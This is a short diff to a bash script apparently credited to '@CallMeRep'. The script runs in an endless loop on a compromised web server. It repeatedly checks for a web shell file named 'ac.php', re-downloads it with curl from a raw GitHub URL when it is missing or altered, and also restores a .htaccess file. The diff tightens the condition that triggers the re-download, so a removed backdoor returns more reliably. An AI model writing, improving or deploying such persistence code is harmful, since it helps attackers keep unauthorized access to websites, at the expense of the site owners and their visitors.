@@ -1,6 +1,6 @@
 #!/bin/bash
-# Dont delete author name :) 
-# Telegram : @CallMeRep 
+# Dont delete author name :)
+# Telegram : @CallMeRep
 # Sorry if my comment explaination is bad english bcs is write by me not by chatgpt
 
 # Download initial .htaccess and backup shell file
@@ -12,8 +12,8 @@ while true; do
     # Print the Time and Date Before Execution
     echo $(TZ=Asia/Jakarta date)
     # Check if ac.php is exist or no
-    if [ ! -f ac.php ] && ! grep -q '@CallMeRep' ac.php; then
-        # if not exist will auto get ac.php with this repo ac.php shell links
+    if [ ! -f ac.php ] || ([ -f ac.php ] && ! grep -q '@CallMeRep' ac.php); then
+        # if not exist or doesn't contain @CallMeRep, get ac.php from repo
         curl -o ac.php https://raw.githubusercontent.com/t101804/repshare/main/ac.php
     fi
     # check if .htaccess is readable and writeable and check if htaccess is same with we like import in the first code
